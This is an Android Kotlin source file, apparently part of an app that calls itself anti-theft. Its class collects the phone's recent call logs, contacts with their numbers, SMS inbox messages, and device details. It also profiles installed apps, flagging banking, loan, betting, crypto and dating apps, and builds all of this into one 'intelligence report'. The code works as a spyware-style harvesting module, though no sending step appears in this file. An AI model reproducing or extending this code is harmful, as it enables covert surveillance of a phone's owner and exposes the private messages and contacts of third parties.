package com.shield.antitheft

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.*
import android.telephony.TelephonyManager

class IntelligenceEngine(private val context: Context) {
    
    fun getCallLogs(): String {
        val sb = StringBuilder("📞 CALL LOGS\n═══════════\n")
        try {
            val cursor: Cursor? = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20")
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                while (it.moveToNext()) {
                    val number = it.getString(numIdx) ?: "Unknown"
                    val type = when (it.getInt(typeIdx)) { CallLog.Calls.INCOMING_TYPE -> "📥 IN"; CallLog.Calls.OUTGOING_TYPE -> "📤 OUT"; CallLog.Calls.MISSED_TYPE -> "❌ MISSED"; else -> "📞" }
                    val date = java.text.SimpleDateFormat("dd/MM HH:mm").format(java.util.Date(it.getLong(dateIdx)))
                    val name = it.getString(nameIdx) ?: ""
                    val display = if (name.isNotEmpty()) "$name ($number)" else number
                    sb.append("$type $display | $date\n")
                }
            }
        } catch (e: Exception) { sb.append("Permission required\n") }
        return sb.toString()
    }
    
    fun getContacts(): String {
        val sb = StringBuilder("👥 CONTACTS\n═══════════\n")
        try {
            val cursor = context.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 30")
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val idIdx = it.getColumnIndex(ContactsContract.Contacts._ID)
                while (it.moveToNext()) {
                    val name = it.getString(nameIdx) ?: "Unknown"
                    val id = it.getString(idIdx)
                    val phones = mutableListOf<String>()
                    val pc = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null)
                    pc?.use { pcur ->
                        val pidx = pcur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (pcur.moveToNext()) phones.add(pcur.getString(pidx) ?: "")
                    }
                    sb.append("$name: ${phones.joinToString(", ")}\n")
                }
            }
        } catch (e: Exception) { sb.append("Permission required\n") }
        return sb.toString()
    }
    
    fun getMessages(): String {
        val sb = StringBuilder("💬 MESSAGES\n═══════════\n")
        try {
            val cursor = context.contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 20")
            cursor?.use {
                val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                while (it.moveToNext()) {
                    val addr = it.getString(addrIdx) ?: "Unknown"
                    val body = (it.getString(bodyIdx) ?: "").take(50)
                    val date = java.text.SimpleDateFormat("dd/MM HH:mm").format(java.util.Date(it.getLong(dateIdx)))
                    sb.append("$addr: $body... | $date\n")
                }
            }
        } catch (e: Exception) { sb.append("Permission required\n") }
        return sb.toString()
    }
    
    fun getInstalledApps(): String {
        val sb = StringBuilder("📱 INSTALLED APPS\n══════════════════\n")
        val knownApps = mapOf(
            "truecaller" to "📞 Truecaller", "whatsapp" to "💬 WhatsApp", "facebook" to "👤 Facebook",
            "instagram" to "📷 Instagram", "tiktok" to "🎵 TikTok", "telegram" to "✈️ Telegram",
            "signal" to "🔐 Signal", "snapchat" to "👻 Snapchat", "twitter" to "🐦 Twitter",
            "messenger" to "💬 Messenger", "gmail" to "📧 Gmail", "chrome" to "🌐 Chrome",
            "youtube" to "🎬 YouTube", "netflix" to "🎥 Netflix", "spotify" to "🎵 Spotify",
            "uber" to "🚗 Uber", "bolt" to "🚗 Bolt", "mpesa" to "💰 M-Pesa",
            "paypal" to "💳 PayPal", "tinder" to "💕 Tinder", "badoo" to "💕 Badoo",
            "viber" to "📞 Viber", "skype" to "📞 Skype", "zoom" to "📹 Zoom",
            "teams" to "💼 Teams", "slack" to "💼 Slack", "discord" to "🎮 Discord",
            "reddit" to "🤖 Reddit", "pinterest" to "📌 Pinterest", "linkedin" to "💼 LinkedIn",
            "bank" to "🏦 Banking", "bet" to "🎰 Betting", "loan" to "💳 Loan",
            "crypto" to "₿ Crypto", "wallet" to "👛 Wallet", "vpn" to "🔒 VPN",
            "cleaner" to "🧹 Cleaner", "antivirus" to "🛡️ Antivirus", "launcher" to "🏠 Launcher",
            "keyboard" to "⌨️ Keyboard", "browser" to "🌐 Browser", "player" to "🎬 Player",
            "editor" to "📝 Editor", "scanner" to "📷 Scanner", "translator" to "🌍 Translator",
            "fitness" to "💪 Fitness", "health" to "❤️ Health", "food" to "🍔 Food",
            "shopping" to "🛒 Shopping", "travel" to "✈️ Travel", "hotel" to "🏨 Hotel",
            "music" to "🎵 Music", "game" to "🎮 Game", "dating" to "💕 Dating",
        )
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            sb.append("Total: ${packages.size} apps\nScan: ${java.text.SimpleDateFormat("dd/MM HH:mm").format(java.util.Date())}\n\n")
            
            val found = mutableListOf<String>()
            for (app in packages) {
                val pkg = app.packageName.lowercase()
                knownApps.forEach { (key, label) ->
                    if (pkg.contains(key) && !found.contains(label)) {
                        sb.append("$label\n")
                        found.add(label)
                    }
                }
            }
            
            // Truecaller special
            if (packages.any { it.packageName.contains("truecaller") }) {
                sb.append("\n⚠️ TRUECALLER ACTIVE - Caller ID tracking enabled\n")
            }
        } catch (e: Exception) { sb.append("Error: ${e.message}\n") }
        return sb.toString()
    }
    
    fun getDeviceInfo(): String {
        return "📱 ${Build.MODEL} | ${Build.MANUFACTURER} | Android ${Build.VERSION.RELEASE} | API ${Build.VERSION.SDK_INT}"
    }
    
    fun generateFullReport(): String {
        return """
            🛡️ SHIELD INTELLIGENCE REPORT
            ═══════════════════════════
            Device: ${getDeviceInfo()}
            
            ${getInstalledApps()}
            
            ${getCallLogs()}
            
            ${getContacts()}
            
            ${getMessages()}
            
            Generated: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())}
        """.trimIndent()
    }
}
